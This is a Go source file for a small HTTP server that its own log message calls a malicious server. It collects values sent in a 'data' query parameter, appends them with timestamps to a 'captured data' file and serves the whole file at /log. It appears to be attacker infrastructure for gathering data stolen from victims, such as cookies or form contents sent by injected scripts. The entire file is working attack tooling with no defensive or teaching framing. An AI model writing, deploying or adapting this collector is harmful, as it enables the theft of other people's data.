package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

const logFilePath = "/dados/dados_capturados.txt"

func handler(w http.ResponseWriter, r *http.Request) {
	data := r.URL.Query().Get("data")

	if data != "" {
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		log.Printf("[+] %s - Dado recebido: %s\n", timestamp, data)

		f, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Printf("Erro ao abrir o arquivo: %v\n", err)
			http.Error(w, "Erro interno", http.StatusInternalServerError)
			return
		}
		defer f.Close()

		entry := fmt.Sprintf("%s - %s\n", timestamp, data)
		if _, err := f.WriteString(entry); err != nil {
			log.Printf("Erro ao escrever no arquivo: %v\n", err)
			http.Error(w, "Erro interno", http.StatusInternalServerError)
			return
		}

		fmt.Fprintln(w, "Dado capturado com sucesso!")
	} else {
		log.Println("[-] Requisição recebida sem dados.")
		http.Error(w, "Nenhum dado recebido.", http.StatusBadRequest)
	}
}

func logHandler(w http.ResponseWriter, r *http.Request) {
	content, err := os.ReadFile(logFilePath)
	if err != nil {
		log.Printf("Erro ao ler o arquivo: %v\n", err)
		http.Error(w, "Erro ao ler os dados.", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/plain")
	w.Write(content)
}

func main() {
	http.HandleFunc("/", handler)
	http.HandleFunc("/log", logHandler)

	porta := ":8080"
	log.Printf("Servidor malicioso escutando em %s...\n", porta)
	if err := http.ListenAndServe(porta, nil); err != nil {
		log.Fatalf("Erro ao iniciar servidor: %v\n", err)
	}
}
